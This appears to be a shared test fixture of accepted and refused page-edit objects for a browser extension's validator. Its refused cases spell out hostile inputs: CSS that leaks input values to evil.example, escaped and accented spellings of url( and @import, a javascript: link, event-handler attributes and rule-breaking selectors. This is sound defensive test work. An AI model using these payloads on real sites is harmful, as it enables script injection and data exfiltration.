{
 "about": "Page edits: what Edits.swift and the extension's src/shared/edits.js both take and both refuse. Each refused case names the field the refusal must point at.",
 "accept": [
  {"case": "hide", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "hide", "at": "#ads, .promo"}]}},
  {"case": "style", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "style", "at": "article", "style": {"font-size": "18px", "max-width": "calc(100% - 2rem)", "--gap": "4px"}}]}},
  {"case": "text", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "text", "at": "h1", "text": "Home", "find": "Welcome"}]}},
  {"case": "text to nothing", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "text", "at": "h1", "text": ""}]}},
  {"case": "attr", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "attr", "at": "input[type=search]", "name": "placeholder", "value": "Search"}]}},
  {"case": "attr taken away", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "attr", "at": "details", "name": "open", "value": null}]}},
  {"case": "move", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "move", "at": "#nav", "to": "main", "where": "first"}]}},
  {"case": "insert", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "insert", "at": "main", "where": "first", "blocks": [{"kind": "heading", "text": "Today"}, {"kind": "text", "text": "Read this first"}, {"kind": "list", "items": ["One", "Two"]}, {"kind": "link", "text": "More", "url": "https://example.org/a?b=c#d"}]}]}},
  {"case": "css", "edit": {"id": "a", "sites": ["example.com"], "css": "/* wide */ @media (width < 600px) { main { width: 100% } }"}},
  {"case": "paths and name", "edit": {"id": "a", "sites": ["example.com"], "name": "Calm", "paths": ["/home", "/watch/*"], "css": "a{color:red}"}},
  {"case": "off", "edit": {"id": "a", "sites": ["example.com"], "enabled": false, "css": "a{color:red}"}},
  {"case": "site as a link", "edit": {"id": "a", "sites": ["https://www.Example.com/path"], "css": "a{color:red}"}},
  {"case": "data in a word, not a fetch", "edit": {"id": "a", "sites": ["example.com"], "css": ".curl-up{color:red}"}}
 ],
 "refuse": [
  {"case": "not an object", "edit": [], "path": "$"},
  {"case": "no id", "edit": {"sites": ["example.com"], "css": "a{}"}, "path": "id"},
  {"case": "capital in id", "edit": {"id": "A", "sites": ["example.com"], "css": "a{}"}, "path": "id"},
  {"case": "no sites", "edit": {"id": "a", "css": "a{}"}, "path": "sites"},
  {"case": "empty sites", "edit": {"id": "a", "sites": [], "css": "a{}"}, "path": "sites"},
  {"case": "site not a host", "edit": {"id": "a", "sites": ["exa mple"], "css": "a{}"}, "path": "sites[0]"},
  {"case": "every site", "edit": {"id": "a", "sites": ["*"], "css": "a{}"}, "path": "sites[0]"},
  {"case": "nothing to do", "edit": {"id": "a", "sites": ["example.com"]}, "path": "$"},
  {"case": "unknown field", "edit": {"id": "a", "sites": ["example.com"], "css": "a{}", "run": "x"}, "path": "run"},
  {"case": "script field", "edit": {"id": "a", "sites": ["example.com"], "css": "a{}", "script": "alert(1)"}, "path": "script"},
  {"case": "path with no slash", "edit": {"id": "a", "sites": ["example.com"], "paths": ["home"], "css": "a{}"}, "path": "paths[0]"},
  {"case": "enabled not a boolean", "edit": {"id": "a", "sites": ["example.com"], "enabled": "yes", "css": "a{}"}, "path": "enabled"},
  {"case": "changes not a list", "edit": {"id": "a", "sites": ["example.com"], "changes": {}}, "path": "changes"},
  {"case": "unknown verb", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "click", "at": "a"}]}, "path": "changes[0].do"},
  {"case": "type verb", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "type", "at": "input", "text": "x"}]}, "path": "changes[0].do"},
  {"case": "no selector", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "hide"}]}, "path": "changes[0].at"},
  {"case": "selector ends its rule", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "hide", "at": "a{} b"}]}, "path": "changes[0].at"},
  {"case": "selector with a backslash", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "hide", "at": "a\\62"}]}, "path": "changes[0].at"},
  {"case": "selector left open", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "hide", "at": "a:not(.b"}]}, "path": "changes[0].at"},
  {"case": "field of another verb", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "hide", "at": "a", "text": "x"}]}, "path": "changes[0].text"},
  {"case": "empty style", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "style", "at": "a", "style": {}}]}, "path": "changes[0].style"},
  {"case": "style value that fetches", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "style", "at": "a", "style": {"background": "URL(https://evil.example/x)"}}]}, "path": "changes[0].style.background"},
  {"case": "style value that ends the rule", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "style", "at": "a", "style": {"color": "red;} b{"}}]}, "path": "changes[0].style.color"},
  {"case": "style name that is not one", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "style", "at": "a", "style": {"color:red;x": "1"}}]}, "path": "changes[0].style.color:red;x"},
  {"case": "attr that links", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "attr", "at": "a", "name": "href", "value": "https://evil.example"}]}, "path": "changes[0].name"},
  {"case": "attr that runs", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "attr", "at": "a", "name": "onclick", "value": "x()"}]}, "path": "changes[0].name"},
  {"case": "attr that fetches", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "attr", "at": "img", "name": "src", "value": "https://evil.example"}]}, "path": "changes[0].name"},
  {"case": "attr that fills a form", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "attr", "at": "input", "name": "value", "value": "x"}]}, "path": "changes[0].name"},
  {"case": "attr with no value", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "attr", "at": "a", "name": "title"}]}, "path": "changes[0].value"},
  {"case": "move with no place", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "move", "at": "a", "to": "b"}]}, "path": "changes[0].where"},
  {"case": "insert html", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "insert", "at": "a", "where": "first", "blocks": [{"kind": "html", "text": "<b>"}]}]}, "path": "changes[0].blocks[0].kind"},
  {"case": "insert nothing", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "insert", "at": "a", "where": "first", "blocks": []}]}, "path": "changes[0].blocks"},
  {"case": "link that runs", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "insert", "at": "a", "where": "first", "blocks": [{"kind": "link", "text": "x", "url": "javascript:alert(1)"}]}]}, "path": "changes[0].blocks[0].url"},
  {"case": "link with a user name", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "insert", "at": "a", "where": "first", "blocks": [{"kind": "link", "text": "x", "url": "https://bank.example@evil.example/"}]}]}, "path": "changes[0].blocks[0].url"},
  {"case": "empty text block", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "insert", "at": "a", "where": "first", "blocks": [{"kind": "text", "text": " "}]}]}, "path": "changes[0].blocks[0].text"},
  {"case": "css that fetches", "edit": {"id": "a", "sites": ["example.com"], "css": "input[value^=a]{background:url(https://evil.example/a)}"}, "path": "css"},
  {"case": "css that spells url another way", "edit": {"id": "a", "sites": ["example.com"], "css": "a{background:\\75rl(https://evil.example)}"}, "path": "css"},
  {"case": "css image-set", "edit": {"id": "a", "sites": ["example.com"], "css": "a{background:-webkit-image-set('https://evil.example' 1x)}"}, "path": "css"},
  {"case": "css import", "edit": {"id": "a", "sites": ["example.com"], "css": "@import 'https://evil.example/x.css';"}, "path": "css"},
  {"case": "css font", "edit": {"id": "a", "sites": ["example.com"], "css": "@font-face{font-family:x;src:local(x)}"}, "path": "css"},
  {"case": "css cross-fade", "edit": {"id": "a", "sites": ["example.com"], "css": "a{background:cross-fade('https://evil.example' 50%,red)}"}, "path": "css"},
  {"case": "url( with an accent after it", "edit": {"id": "a", "sites": ["example.com"], "css": "a{background:url(\u0301https://evil.example)}"}, "path": "css"},
  {"case": "an at-rule with an accent after the @", "edit": {"id": "a", "sites": ["example.com"], "css": "@\u0301import 'x';"}, "path": "css"},
  {"case": "a brace with an accent after it in a value", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "style", "at": "a", "style": {"color": "red}\u0301 b{"}}]}, "path": "changes[0].style.color"},
  {"case": "a comment mark with an accent after it in a selector", "edit": {"id": "a", "sites": ["example.com"], "changes": [{"do": "hide", "at": "a/*\u0301"}]}, "path": "changes[0].at"},
  {"case": "a question mark with an accent after it in a path", "edit": {"id": "a", "sites": ["example.com"], "paths": ["/a?\u0301"], "css": "a{}"}, "path": "paths[0]"}
 ]
}
